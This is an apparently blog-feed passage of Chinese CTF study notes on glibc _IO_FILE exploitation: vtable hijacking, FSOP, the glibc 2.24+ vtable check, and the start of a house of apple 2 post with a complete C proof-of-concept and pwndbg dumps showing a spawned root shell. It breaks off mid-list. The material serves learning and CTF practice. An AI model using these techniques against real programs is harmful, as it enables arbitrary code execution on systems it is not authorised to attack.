0x0000000000000000</span><br><span class="line">pwndbg&gt; p system</span><br><span class="line">$8 = &#123;&lt;text variable, no debug info&gt;&#125; 0x721dfe9533a0 &lt;system&gt;</span><br><span class="line">pwndbg&gt; p *fp</span><br><span class="line">$9 = &#123;</span><br><span class="line">  _flags = 1852400175,</span><br><span class="line">  _IO_read_ptr = 0x0,</span><br><span class="line">  _IO_read_end = 0x0,</span><br><span class="line">  _IO_read_base = 0x0,</span><br><span class="line">  _IO_write_base = 0x0,</span><br><span class="line">  _IO_write_ptr = 0x0,</span><br><span class="line">  _IO_write_end = 0x0,</span><br><span class="line">  _IO_buf_base = 0x0,</span><br><span class="line">  _IO_buf_end = 0x0,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x721dfecd3540 &lt;_IO_2_1_stderr_&gt;,</span><br><span class="line">  _fileno = 3,</span><br><span class="line">  _flags2 = 0,</span><br><span class="line">  _old_offset = 0,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;&quot;,</span><br><span class="line">  _lock = 0x5ecb5d7870f0,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x5ecb5d787100,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = 0,</span><br><span class="line">  _unused2 = &#x27;\000&#x27; &lt;repeats 19 times&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到fp的<code>_flags</code>位写成了1852400175也就是0x6E69622F，”&#x2F;bin”的ASCII码的小端序存储（<del>其实这里直接写”sh”更直观一点，因为flag位只有四字节，但笔者懒得改了</del>），并且<code>__xsputn</code>函数指针的位置也改写成了<code>system</code>函数地址0x721dfe9533a0<br>接下来执行<code>fwrite</code>函数，其会以fp指针为参数调用虚表中的<code>__xsputn</code>函数，我们修改后也就相当于调用了<code>system(&quot;sh&quot;);</code><br>我们进入<code>fwrite</code>逐步调试发现确实进入了<code>system</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">► 0x721dfe9533a0 &lt;system&gt;      test   rdi, rdi</span><br><span class="line">  0x721dfe9533a3 &lt;system+3&gt;    je     system+16                &lt;system+16&gt;</span><br><span class="line"></span><br><span class="line">  0x721dfe9533a5 &lt;system+5&gt;    jmp    0x721dfe952e30                &lt;0x721dfe952e30&gt;</span><br><span class="line">   ↓</span><br><span class="line">  0x721dfe952e30               push   r12</span><br><span class="line">  0x721dfe952e32               push   rbp</span><br><span class="line">  0x721dfe952e33               xor    eax, eax</span><br><span class="line">  0x721dfe952e35               push   rbx</span><br><span class="line">  0x721dfe952e36               mov    ecx, 0x10</span><br><span class="line">  0x721dfe952e3b               mov    rbx, rdi</span><br><span class="line">  0x721dfe952e3e               mov    esi, 1</span><br><span class="line">  0x721dfe952e43               sub    rsp, 0x170</span><br></pre></td></tr></table></figure><p>最后执行效果</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">[Attaching after process 149 fork to child process 158]</span><br><span class="line">[New inferior 2 (process 158)]</span><br><span class="line">[Detaching after fork from parent process 149]</span><br><span class="line">[Inferior 1 (process 149) detached]</span><br><span class="line">process 158 is executing new program: /usr/bin/dash</span><br><span class="line">Error in re-setting breakpoint 1: Function &quot;main&quot; not defined.</span><br><span class="line">[Attaching after process 158 fork to child process 159]</span><br><span class="line">[New inferior 3 (process 159)]</span><br><span class="line">[Detaching after fork from parent process 158]</span><br><span class="line">[Inferior 2 (process 158) detached]</span><br><span class="line">process 159 is executing new program: /usr/bin/dash</span><br><span class="line"># whoami</span><br><span class="line">[Attaching after process 159 fork to child process 160]</span><br><span class="line">[New inferior 4 (process 160)]</span><br><span class="line">[Detaching after fork from parent process 159]</span><br><span class="line">[Inferior 3 (process 159) detached]</span><br><span class="line">process 160 is executing new program: /usr/bin/whoami</span><br><span class="line">root</span><br><span class="line"># [Inferior 4 (process 160) exited normally]</span><br><span class="line"></span><br><span class="line">[1]+  Stopped                 gdb ./demo</span><br><span class="line">root@042a287ef431:/ctf/work#</span><br></pre></td></tr></table></figure><p>看到whoami指令返回了root（因为笔者这里实在docker容器里调试的，容器里默认是root，但是这里输出这么多行提示信息并且执行一次命令后便退出了是什么情况我也不是很清楚…）</p><h2 id="0x02-FSOP"><a href="#0x02-FSOP" class="headerlink" title="0x02 FSOP"></a>0x02 FSOP</h2><p>FSOP 是 File Stream Oriented Programming 的缩写，根据前面对 FILE 的介绍得知进程内所有的<code>_IO_FILE </code>结构会使用<code>_chain </code>域相互连接形成一个链表，这个链表的头部由<code>_IO_list_all </code>维护。<br>FSOP 的核心思想就是劫持<code>_IO_list_all </code>的值来伪造链表和其中的<code>_IO_FILE_plus</code>项，但是单纯的伪造只是构造了数据还需要某种方法进行触发。FSOP 选择的触发方法是调用<code>_IO_flush_all_lockp</code>，这个函数会刷新<code>_IO_list_all </code>链表中所有项的文件流，相当于对每个 FILE 调用 fflush，也对应着会调用<code>_IO_FILE_plus.vtable</code> 中的<code>_IO_overflow</code><br><code>_IO_flush_all_lockp</code>函数并不需要手动调用，当程序从<code>main</code>返回时，或者执行<code>exit</code>函数时，亦或者是libc执行<code>abort</code>流程时（高版本已经弃用），<code>_IO_flush_all_lockp</code>会被系统调用<br>我们伪造的<code>_IO_FILE_plus</code>需要满足<code>_IO_flush_all_lockp</code>的执行条件，也就是</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (((fp-&gt;_mode &lt;= <span class="number">0</span> &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base))</span><br><span class="line">               &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)</span><br><span class="line">           &#123;</span><br><span class="line">               result = EOF;</span><br><span class="line">          &#125;</span><br></pre></td></tr></table></figure><p>那么常规的攻击方法便是覆盖<code>_IO_list_all </code>为一个chunk地址，然后伪造一个<code>_IO_FILE_plus</code>结构体，亦或者是直接修改其指向的<code>_IO_FILE_plus</code>结构体（一般都是<code> _IO_2_1_stderr_</code>）<br>然后就是记录一下一个模版：引用自_sky123_师傅：<br>不妨将<code>vtable</code>伪造在<code>_IO_2_1_stderr_ + 0x10</code>处使<code>_IO_overflow</code>，<code> _IO_2_1_stderr_</code>的<code>fp-&gt;_IO_write_ptr</code>恰好对应于 <code>vtable</code> 的 <code>_IO_overflow</code> 。然后向<code>fp-&gt;_IO_write_ptr</code> 写入 <code>system</code>函数地址。由于<code>_IO_overflow</code>传入的参数为<code>_IO_2_1_stderr_</code>结构体，因此向其<code>_flags</code>处写入 <code>/bin/sh</code> 字符串<br>如下图所示</p><p><img src="/images/dd959c3c75c4474daa78787724d3a84e.png"></p><h2 id="0x03-glibc2-24-：劫持vtable到-IO-str-jumps以及house-of系列"><a href="#0x03-glibc2-24-：劫持vtable到-IO-str-jumps以及house-of系列" class="headerlink" title="0x03 glibc2.24+：劫持vtable到_IO_str_jumps以及house of系列"></a>0x03 glibc2.24+：劫持vtable到_IO_str_jumps以及house of系列</h2><p>我们重新看glibc2.24+<code>vtable</code>的check机制</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *</span><br><span class="line"><span class="title function_">IO_validate_vtable</span> <span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">     section.  */</span></span><br><span class="line">  <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *ptr = (<span class="type">const</span> <span class="type">char</span> *) vtable;</span><br><span class="line">  <span class="type">uintptr_t</span> offset = ptr - __start___libc_IO_vtables;</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">    <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">       slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">    _IO_vtable_check ();</span><br><span class="line">  <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vtable</code> 必须要满足 在 <code>__stop___IO_vtables</code> 和 <code>__start___libc_IO_vtables</code>之间，而我们伪造的<code>vtable</code>通常不满足这个条件。<br>但是<code> _IO_str_jumps</code> 与 <code>_IO_wstr_jumps </code>就位于<code>__stop___libc_IO_vtables</code>和<code>__start___libc_IO_vtables</code>之间，所以我们是可以利用他们来绕过<code>IO_validate_vtable</code>的检测的,只需要将 <code>vtable </code>填成 <code>_IO_str_jumps </code>或<code>_IO_wstr_jumps</code>地址即可。<br>利用方式主要有针对 <code>_IO_str_jumps</code> 中的<code>_IO_str_finsh</code>函数和 <code>_IO_str_overflow</code>两种，这里先简单提一嘴，后续开新博客细说（<del>咕咕</del>）<br>同样的在glibc2.24+，简单的FSOP利用变得非常困难</p><table><thead><tr><th>机制</th><th>目的</th></tr></thead><tbody><tr><td><code>_IO_vtable_check</code></td><td>检查 vtable 是否在 <code>__libc_IO_vtables</code> 区域</td></tr><tr><td><code>_flags</code>、<code>_mode</code> 等验证</td><td>强化 <code>_IO_FILE</code> 的完整性与一致性</td></tr><tr><td><code>_chain</code> 检查</td><td>强化链表结构的正确性</td></tr><tr><td>强制使用 <code>_IO_FILE_plus</code></td><td>限制构造自由度</td></tr></tbody></table><p>于是有了house of系列攻击方法，house of 系列后面再继续学习，会开新博客的（<del>咕咕</del>）</p>]]></content>
      
      
      <categories>
          
          <category> pwn </category>
          
          <category> heap </category>
          
          <category> _IO_FILE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于house of apple</title>
      <link href="/2025/07/27/%E5%85%B3%E4%BA%8Ehouse-of-apple/"/>
      <url>/2025/07/27/%E5%85%B3%E4%BA%8Ehouse-of-apple/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>在复现LitCTF2024的heap-2.39时候遇到了house of apple，既然碰到了，那么就学习一下吧！（<del>其实在上学期校赛的时候就碰到了</del>）</p><h2 id="0x01-house-of-apple-原理"><a href="#0x01-house-of-apple-原理" class="headerlink" title="0x01 house of apple 原理"></a>0x01 house of apple 原理</h2><p>先贴上roderick01师傅的原创文章镇帖（<br>[<a href="https://bbs.kanxue.com/thread-273418.htm">原创] House of apple 一种新的glibc中IO攻击方法 (1)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><br>[<a href="https://bbs.kanxue.com/thread-273832.htm">原创] House of apple 一种新的glibc中IO攻击方法 (2)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a><br>[<a href="https://bbs.kanxue.com/thread-273863.htm">原创]House of apple 一种新的glibc中IO攻击方法 (3)-Pwn-看雪-安全社区|安全招聘|kanxue.com</a></p><p>我们调试demo （姑且先看apple2）</p><h4 id="IO-wfile-overflow"><a href="#IO-wfile-overflow" class="headerlink" title="_IO_wfile_overflow"></a>_IO_wfile_overflow</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">_IO_wfile_overflow</span><br><span class="line">    _IO_wdoallocbuf</span><br><span class="line">        _IO_WDOALLOCATE</span><br><span class="line">            *(fp-&gt;_wide_data-&gt;_wide_vtable + 0x68)(fp)</span><br></pre></td></tr></table></figure><p>demo如下（glibc2.35）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">char</span> *p1 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="type">char</span> *p2 = <span class="built_in">calloc</span>(<span class="number">0x200</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*] allocate two 0x200 chunks&quot;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> puts_addr = (<span class="type">size_t</span>)&amp;<span class="built_in">puts</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> _IO_2_1_stderr_addr = puts_addr + <span class="number">0x19a850</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_2_1_stderr_ address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_2_1_stderr_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">size_t</span> _IO_wfile_jumps_addr = puts_addr + <span class="number">0x196270</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] _IO_wfile_jumps address: %p\n&quot;</span>, (<span class="type">void</span> *)_IO_wfile_jumps_addr);</span><br><span class="line">  </span><br><span class="line">    <span class="type">char</span> *stderr2 = (<span class="type">char</span> *)_IO_2_1_stderr_addr;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 1: change stderr-&gt;_flags to 0xfffff7f5 + ;sh&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)stderr2 = <span class="number">0xfbadf7f5</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(&amp;stderr2[<span class="number">4</span>], <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;;sh\x00&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 2: set stderr-&gt;_IO_write_base &lt;  stderr-&gt;_IO_write_ptr&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x20</span>) = (<span class="type">size_t</span>)<span class="number">1</span>;</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0x28</span>) = (<span class="type">size_t</span>)<span class="number">2</span>;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 3: change stderr-&gt;_mode to -1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xc0</span>) = <span class="number">-1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 4: change stderr-&gt;vtable to _IO_wfile_jumps&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xd8</span>) = _IO_wfile_jumps_addr;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 5: replace stderr-&gt;_wide_data with the allocated chunk p1&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(stderr2 + <span class="number">0xa0</span>) = (<span class="type">size_t</span>)p1;</span><br><span class="line">  </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0xe0</span>) = (<span class="type">size_t</span>)p2;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 7: set stderr-&gt;_wide_data-&gt;_IO_write_base = 0  stderr-&gt;_wide_data-&gt;_IO_buf_base = 0&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0x30</span>) = (<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line">    *(<span class="type">size_t</span> *)(p1 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: put backdoor at fake _wide_vtable-&gt;doallocate&quot;</span>);</span><br><span class="line">    <span class="type">size_t</span> sys_addr = (<span class="type">size_t</span>)&amp;system;</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x68</span>) = (<span class="type">size_t</span>)(sys_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 9: call exit to trigger backdoor func&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接运行到最后一步前，看<code>stderr</code>的相关状态</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *stderr</span><br><span class="line">$2 = &#123;</span><br><span class="line">  _flags = -72484875,</span><br><span class="line">  _IO_read_ptr = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_read_end = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_read_base = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_write_base = 0x1 &lt;error: Cannot access memory at address 0x1&gt;,</span><br><span class="line">  _IO_write_ptr = 0x2 &lt;error: Cannot access memory at address 0x2&gt;,</span><br><span class="line">  _IO_write_end = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_base = 0x7ffff7e1b723 &lt;_IO_2_1_stderr_+131&gt; &quot;&quot;,</span><br><span class="line">  _IO_buf_end = 0x7ffff7e1b724 &lt;_IO_2_1_stderr_+132&gt; &quot;&quot;,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _markers = 0x0,</span><br><span class="line">  _chain = 0x7ffff7e1b780 &lt;_IO_2_1_stdout_&gt;,</span><br><span class="line">  _fileno = 2,</span><br><span class="line">  _flags2 = 0,</span><br><span class="line">  _old_offset = -1,</span><br><span class="line">  _cur_column = 0,</span><br><span class="line">  _vtable_offset = 0 &#x27;\000&#x27;,</span><br><span class="line">  _shortbuf = &quot;&quot;,</span><br><span class="line">  _lock = 0x7ffff7e1ca60 &lt;_IO_stdfile_2_lock&gt;,</span><br><span class="line">  _offset = -1,</span><br><span class="line">  _codecvt = 0x0,</span><br><span class="line">  _wide_data = 0x5555555592a0,</span><br><span class="line">  _freeres_list = 0x0,</span><br><span class="line">  _freeres_buf = 0x0,</span><br><span class="line">  __pad5 = 0,</span><br><span class="line">  _mode = -1,</span><br><span class="line">  _unused2 = &quot;\377\377\377\377&quot;, &#x27;\000&#x27; &lt;repeats 15 times&gt;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *(struct _IO_wide_data*)0x5555555592a0</span><br><span class="line">$3 = &#123;</span><br><span class="line">  _IO_read_ptr = 0x0,</span><br><span class="line">  _IO_read_end = 0x0,</span><br><span class="line">  _IO_read_base = 0x0,</span><br><span class="line">  _IO_write_base = 0x0,</span><br><span class="line">  _IO_write_ptr = 0x0,</span><br><span class="line">  _IO_write_end = 0x0,</span><br><span class="line">  _IO_buf_base = 0x0,</span><br><span class="line">  _IO_buf_end = 0x0,</span><br><span class="line">  _IO_save_base = 0x0,</span><br><span class="line">  _IO_backup_base = 0x0,</span><br><span class="line">  _IO_save_end = 0x0,</span><br><span class="line">  _IO_state = &#123;</span><br><span class="line">    __count = 0,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = 0,</span><br><span class="line">      __wchb = &quot;\000\000\000&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _IO_last_state = &#123;</span><br><span class="line">    __count = 0,</span><br><span class="line">    __value = &#123;</span><br><span class="line">      __wch = 0,</span><br><span class="line">      __wchb = &quot;\000\000\000&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _codecvt = &#123;</span><br><span class="line">    __cd_in = &#123;</span><br><span class="line">      step = 0x0,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = 0x0,</span><br><span class="line">        __outbufend = 0x0,</span><br><span class="line">        __flags = 0,</span><br><span class="line">        __invocation_counter = 0,</span><br><span class="line">        __internal_use = 0,</span><br><span class="line">        __statep = 0x0,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = 0,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = 0,</span><br><span class="line">            __wchb = &quot;\000\000\000&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    __cd_out = &#123;</span><br><span class="line">      step = 0x0,</span><br><span class="line">      step_data = &#123;</span><br><span class="line">        __outbuf = 0x0,</span><br><span class="line">        __outbufend = 0x0,</span><br><span class="line">        __flags = 0,</span><br><span class="line">        __invocation_counter = 0,</span><br><span class="line">        __internal_use = 0,</span><br><span class="line">        __statep = 0x0,</span><br><span class="line">        __state = &#123;</span><br><span class="line">          __count = 0,</span><br><span class="line">          __value = &#123;</span><br><span class="line">            __wch = 0,</span><br><span class="line">            __wchb = &quot;\000\000\000&quot;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _shortbuf = L&quot;&quot;,</span><br><span class="line">  _wide_vtable = 0x5555555594b0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwndbg&gt; p *(struct _IO_jump_t*) 0x5555555594b0</span><br><span class="line">$4 = &#123;</span><br><span class="line">  __dummy = 0,</span><br><span class="line">  __dummy2 = 0,</span><br><span class="line">  __finish = 0x0,</span><br><span class="line">  __overflow = 0x0,</span><br><span class="line">  __underflow = 0x0,</span><br><span class="line">  __uflow = 0x0,</span><br><span class="line">  __pbackfail = 0x0,</span><br><span class="line">  __xsputn = 0x0,</span><br><span class="line">  __xsgetn = 0x0,</span><br><span class="line">  __seekoff = 0x0,</span><br><span class="line">  __seekpos = 0x0,</span><br><span class="line">  __setbuf = 0x0,</span><br><span class="line">  __sync = 0x0,</span><br><span class="line">  __doallocate = 0x7ffff7c50d70 &lt;__libc_system&gt;,</span><br><span class="line">  __read = 0x0,</span><br><span class="line">  __write = 0x0,</span><br><span class="line">  __seek = 0x0,</span><br><span class="line">  __close = 0x0,</span><br><span class="line">  __stat = 0x0,</span><br><span class="line">  __showmanyc = 0x0,</span><br><span class="line">  __imbue = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下条件<br><code>fp-&gt;_flags</code>设置为<code>0xfffff7f5</code>或者<code>0xfbadf7f5</code>（满足<code>~(2 | 0x8 | 0x800)</code>），后续四字节根据情况设置为<code>;sh\x00</code><br><code>fp-&gt;vtable</code>设置为<code>_IO_wfile_jumps</code> (<code>/_IO_wfile_jumps_mmap/_IO_wfile_jumps_maybe_mmap</code>)<br><code>fp-&gt;_IO_write_ptr</code> <strong>&gt;</strong> 